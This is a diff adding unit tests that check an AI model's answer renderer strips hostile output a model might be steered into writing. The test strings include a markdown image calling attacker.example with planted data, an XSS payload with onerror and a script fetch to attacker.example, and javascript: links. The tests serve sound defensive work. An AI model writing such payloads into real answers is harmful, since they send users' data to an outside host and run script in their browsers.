@@ -20,3 +20,25 @@ describe("external links in answers", () => {
     expect(html(text, false)).toContain('href="https://attacker.example/c?d=1"');
   });
 });
+
+// The assistant's test battery, group "output exfiltration" (docs/llm-battery.md): what a
+// model may be steered into writing never loads, runs or links to another site.
+describe("what an answer may be steered into writing", () => {
+  it("never loads an image, from anywhere", () => {
+    const out = html("Done. ![t](https://attacker.example/t.png?d=PLANT_DATA)", true);
+    expect(out).not.toContain("<img");
+    expect(out).not.toContain('href="https://attacker.example');
+  });
+
+  it("shows raw HTML as text, never as tags", () => {
+    const out = html("<img src=x onerror=alert(1)><script>fetch('//attacker.example')</script>", true);
+    expect(out).not.toContain("<img");
+    expect(out).not.toContain("<script");
+    expect(out).toContain("&lt;script&gt;");
+  });
+
+  it("never links to javascript: or a protocol-relative address", () => {
+    const out = html("[open](javascript:alert(1)) [site](//attacker.example/x)", true);
+    expect(out).not.toContain("href=");
+  });
+});
